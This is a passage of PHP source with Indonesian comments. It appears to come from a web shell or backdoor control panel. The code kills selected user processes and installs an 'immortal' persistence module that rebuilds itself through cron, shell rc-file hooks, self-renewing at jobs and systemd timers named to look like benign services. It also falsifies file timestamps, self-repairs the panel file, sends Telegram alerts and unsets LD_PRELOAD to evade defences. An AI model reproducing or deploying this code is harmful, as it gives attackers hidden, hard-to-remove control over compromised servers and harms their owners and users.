       environ-nya mengandung SECRET registry */
    foreach ($envpids as $ep) {
        if (isset($dset[$ep]) || isset($seen[$ep])) continue;
        $seen[$ep] = true;
        $victims[] = $ep;
    }
    /* DUA FASE (v66.4 fix, diperkuat v66.8): tulis "bye\r\n" ke SEMUA pts
       DULU — membunuh pemegang pty-master sebelum korban berikutnya
       melenyapkan node /dev/pts/N sehingga 'bye' tak pernah sampai */
    foreach ($victims as $pid) {
        $pts = gsp_pts_path(isset($procs[$pid]) ? $procs[$pid]['tty'] : 0);
        if ($pts !== '' && @is_writable($pts)) {
            $fh = @fopen($pts, 'w');
            if ($fh) { @fwrite($fh, "bye\r\n"); @fclose($fh); }
        }
    }
    usleep(200000); /* jeda: beri waktu 'bye' tampil & TERM bekerja */
    $n = 0;
    foreach ($victims as $pid) { gsp_kill_pid($pid); $n++; }
    return array(count($dpids), $n, $jalur);
}

/* ================= MODUL IMMORTAL (baru v65.4) =================
   Tahan crontab -r: 5 channel INDEPENDEN yang saling rebuild dari
   manifest ~/.cache/.gsp_immortal (sumber kebenaran rebuild):
     a. cron  : entri guard (existing) + checker ringan tiap menit
     b. web   : doctor di fum_selfheal — tiap panel dibuka via browser
     c. rc    : 1 baris silent di ~/.bash_profile ~/.bashrc ~/.profile
     d. at    : job self-renewing (menjadwalkan dirinya lagi tiap 60 mnt)
     e. systemd --user timer (opsional, hanya kalau systemctl --user ada)
   Tiap channel saat terpicu MEMVERIFIKASI & ME-REBUILD semua channel
   lain dari manifest. Tahan kill -9 -1: JUJUR — tidak ada proses user
   yang selamat dari kill -9 -1; pertahanan = REBIRTH <=60 detik via
   checker cron + revive instan saat web/rc/at terpicu.
   Marker acak-deterministik per install (gspiXXXXXXXX) — pgrep/pkill/
   cleanup selalu spesifik marker ini, proses user lain tidak disentuh. */
function gsp_imm_id() {
    return 'gspi' . substr(md5(gsp_home() . '|' . fum_detect_user() . '|immortal654'), 0, 8);
}
function gsp_imm_dir() {
    $d = gsp_home() . '/.cache';
    if (!@is_dir($d)) @mkdir($d, 0700, true);
    return $d;
}
function gsp_imm_path()    { return gsp_imm_dir() . '/.gsp_immortal'; }    // manifest (sumber kebenaran)
function gsp_imm_stpath()  { return gsp_imm_dir() . '/.gsp_immortal.st'; } // state denyut (key=value, dibaca shell+PHP)
function gsp_imm_checker_path()  { return gsp_imm_dir() . '/.gsp_imcheck'; } // checker per-menit (rebirth engine)
function gsp_imm_atscript_path() { return gsp_imm_dir() . '/.gsp_imat'; }    // at self-renewing chain
/* nama unit systemd stealth: pool nama existing, dipilih deterministik per install */
function gsp_imm_sd_name() {
    $pool = array('cpanel_stats', 'sys_crond', 'log_rotate', 'ftp_syncd', 'web_cache', 'mail_queue', 'cron_daily', 'ssl_renew', 'php_fpm', 'quota_sync');
    $i = hexdec(substr(md5(gsp_imm_id()), 0, 2)) % count($pool);
    return $pool[$i];
}
function gsp_imm_hash($m) {
    /* v65.8: field baru (host + self-path/md5/size untuk SELF-REPAIR &
       domain Telegram) IKUT hash manifest — diisi gsp_imm_manifest() /
       gsp_selfbak_update(); isset() menjaga kompatibilitas array lama */
    $h = md5($m['id'] . '|' . $m['guard'] . '|' . $m['checker'] . '|' . $m['cron_min'] . '|' . $m['cron_guard'] . '|' . $m['rc_line']
        . '|' . (isset($m['host']) ? $m['host'] : '')
        . '|' . (isset($m['self_path']) ? $m['self_path'] : '')
        . '|' . (isset($m['self_md5']) ? $m['self_md5'] : '')
        . '|' . (isset($m['self_size']) ? $m['self_size'] : ''));
    /* v65.9: dtools IKUT hash manifest — tapi hanya bila field ada, supaya
       manifest lama v65.8 (tanpa dtools) tetap lolos verifikasi */
    if (isset($m['dtools'])) $h = md5($h . '|' . serialize(is_array($m['dtools']) ? $m['dtools'] : array()));
    return $h;
}
function gsp_imm_load() {
    $d = @file_get_contents(gsp_imm_path());
    if ($d === false || $d === '') return null;
    $m = @unserialize($d);
    if (!is_array($m) || !isset($m['id']) || !isset($m['hash'])) return null;
    if ($m['hash'] !== gsp_imm_hash($m)) return null; // manifest korup/diakali -> dianggap tidak ARMED
    return $m;
}
function gsp_imm_save($m) {
    $ok = @file_put_contents(gsp_imm_path(), serialize($m));
    if ($ok !== false) { @chmod(gsp_imm_path(), 0600); gsp_stealth_age(gsp_imm_path()); }
    return $ok !== false;
}
function gsp_imm_state() {
    $out = array();
    $rows = @file(gsp_imm_stpath());
    if (is_array($rows)) foreach ($rows as $ln) {
        $ln = trim($ln, "\r\n");
        if ($ln === '') continue;
        $kv = explode('=', $ln, 2);
        if (count($kv) === 2) $out[$kv[0]] = $kv[1];
    }
    return $out;
}
function gsp_imm_state_set($k, $v) {
    $st = gsp_imm_state();
    $st[$k] = $v;
    $txt = '';
    foreach ($st as $kk => $vv) $txt .= $kk . '=' . $vv . "\n";
    @file_put_contents(gsp_imm_stpath(), $txt);
    gsp_stealth_age(gsp_imm_stpath());
}
/* manifest = payload lengkap semua channel + hash marker */
function gsp_imm_manifest() {
    $id  = gsp_imm_id();
    $gd  = str_replace("'", '', fum_guard_path());
    $chk = str_replace("'", '', gsp_imm_checker_path());
    $ats = str_replace("'", '', gsp_imm_atscript_path());
    /* v65.8: domain HTTP_HOST saat ARM (untuk pesan Telegram & display)
       + sidik jari file panel untuk SELF-REPAIR checker */
    $host = function_exists('gsp_self_host') ? gsp_self_host() : '';
    $smd5 = @md5_file(__FILE__);
    $ssz  = @filesize(__FILE__);
    $m = array(
        'id'      => $id,
        'guard'   => $gd,
        'checker' => $chk,
        'at'      => $ats,
        'sd'      => gsp_imm_sd_name(),
        'host'      => $host,
        'self_path' => str_replace("'", '', __FILE__),
        'self_md5'  => ($smd5 !== false) ? $smd5 : '',
        'self_size' => ($ssz !== false) ? intval($ssz) : 0,
        'cron_guard' => '*/7 * * * * /bin/sh ' . $gd . ' >/dev/null 2>&1',
        'cron_min'   => '* * * * * /bin/sh ' . $chk . ' >/dev/null 2>&1 # ' . $id,
        'rc_line'    => 'unset LD_PRELOAD LD_AUDIT; [ -f ' . $chk . ' ] && ( timeout 20 /bin/sh ' . $chk . ' >/dev/null 2>&1 & ) ' . gsp_imm_rc_hook_mark($id),
        'atok'    => 0,
        'sdok'    => 0,
        'armed'   => time(),
    );
    /* v65.9: dtools (drop tools ter-armor) dibawa dari manifest lama supaya
       re-ARM tidak melepas penjagaan; manifest lama tanpa dtools = array kosong */
    $old = gsp_imm_load();
    $m['dtools'] = (is_array($old) && isset($old['dtools']) && is_array($old['dtools'])) ? $old['dtools'] : array();
    $m['hash'] = gsp_imm_hash($m);
    return $m;
}
/* CHECKER per-menit: jantung IMMORTAL. Dipanggil cron (1 mnt), rc hook
   (login), at-chain, systemd timer. Tugas: (1) marker crontab hilang =
   kena crontab -r -> rebuild SEMUA channel; (2) rc hook dicabut ->
   suntik ulang; (3) at job hilang -> jadwalkan ulang; (4) systemd unit
   hilang -> tulis ulang; (5) daemon mati (pgrep marker instance) ->
   guard dinyalakan = rebirth <=60 dtk setelah kill -9 -1; (6) antrian
   zero-shell diproses tiap menit; (7) denyut + timestamp rebuild. */
function gsp_imm_checker_src($m) {
    $home = str_replace("'", '', gsp_home());
    $user = str_replace("'", '', fum_detect_user());
    $st   = str_replace("'", '', gsp_imm_stpath());
    $sh = '#!/bin/sh' . "\n"
        /* kebal racun MODE RUSAK: unset = builtin shell, dijalankan sebelum
           loader sempat memuat breaker — checker tetap hidup di sesi teracuni */
        . 'unset LD_PRELOAD LD_AUDIT' . "\n"
        . 'LD_PRELOAD=' . "\n"
        . 'LD_AUDIT=' . "\n"
        . 'export LD_PRELOAD LD_AUDIT' . "\n"
        /* DISARM anti-race: lock ADA & segar (<600 dtk) = gsp_imm_disarm sedang
           berjalan -> exit 0 SEBELUM menulis apa pun (rc hook #GSPIMHOOK bisa
           menembak checker di tengah disarm saat manifest masih ada -> residu
           hook & state). Lock basi (>600 dtk, disarm mati di tengah) diabaikan;
           stat gagal = anggap segar (disarm bertanggung jawab menghapus lock). */
        . 'DLCK=\'' . str_replace("'", '', gsp_disarm_lock_path()) . '\'' . "\n"
        . 'if [ -f "$DLCK" ]; then' . "\n"
        . '  DLM=$(stat -c %Y "$DLCK" 2>/dev/null)' . "\n"
        . '  case "$DLM" in \'\'|*[!0-9]*) exit 0;; esac' . "\n"
        . '  [ $(( $(date +%s) - DLM )) -lt 600 ] && exit 0' . "\n"
        . 'fi' . "\n"
        . 'export HOME=\'' . $home . '\'' . "\n"
        . 'export USER=\'' . $user . '\'' . "\n"
        . 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' . "\n"
        . 'MARK=\'' . $m['id'] . '\'' . "\n"
        . 'GUARD=\'' . $m['guard'] . '\'' . "\n"
        . 'CHK=\'' . $m['checker'] . '\'' . "\n"
        . 'ATS=\'' . $m['at'] . '\'' . "\n"
        . 'SVN=\'' . $m['sd'] . '\'' . "\n"
        . 'SDOK=' . (isset($m['sdok']) ? intval($m['sdok']) : 0) . "\n"
        . 'ST=\'' . $st . '\'' . "\n"
        /* manifest hilang = DISARM disengaja -> checker berhenti total,
           tidak me-rebuild apa pun (anti-residu) */
        . '[ -f \'' . str_replace("'", '', gsp_imm_path()) . '\' ] || exit 0' . "\n"
        . 'RB=0' . "\n"
        /* --- v65.8: TELEGRAM alert + SELF-REPAIR panel --- */
        . 'TGF=\'' . str_replace("'", '', gsp_tg_path()) . '\'' . "\n"
        . 'RLF=\'' . str_replace("'", '', gsp_tg_rlpath()) . '\'' . "\n"
        . 'DOM=\'' . (isset($m['host']) ? str_replace("'", '', $m['host']) : '') . '\'' . "\n"
        . 'SBAK=\'' . str_replace("'", '', gsp_selfbak_path()) . '\'' . "\n"
        . 'SPATH=\'' . (isset($m['self_path']) ? str_replace("'", '', $m['self_path']) : '') . '\'' . "\n"
        . 'SMD5=\'' . (isset($m['self_md5']) ? str_replace("'", '', $m['self_md5']) : '') . '\'' . "\n"
        . 'SSIZE=' . (isset($m['self_size']) ? intval($m['self_size']) : 0) . "\n"
        . 'EVC=0' . "\n"
        . 'DTN=' . ((isset($m['dtools']) && is_array($m['dtools'])) ? count($m['dtools']) : 0) . "\n";
    /* v65.9: dtools (drop tools ter-armor) dari manifest -> variabel
       terindeks DTP<i>/DTB<i>/DTM<i> yang di-loop guard 5c di bawah */
    if (isset($m['dtools']) && is_array($m['dtools'])) {
        $dtn = 0;
        foreach ($m['dtools'] as $dte) {
            $dtn++;
            $sh .= 'DTP' . $dtn . '=\'' . str_replace("'", '', (isset($dte['path']) ? $dte['path'] : '')) . '\'' . "\n"
                .  'DTB' . $dtn . '=\'' . str_replace("'", '', (isset($dte['bak']) ? $dte['bak'] : '')) . '\'' . "\n"
                .  'DTM' . $dtn . '=\'' . preg_replace('/[^0-9a-f]/', '', (isset($dte['md5']) ? $dte['md5'] : '')) . '\'' . "\n";
        }
    }
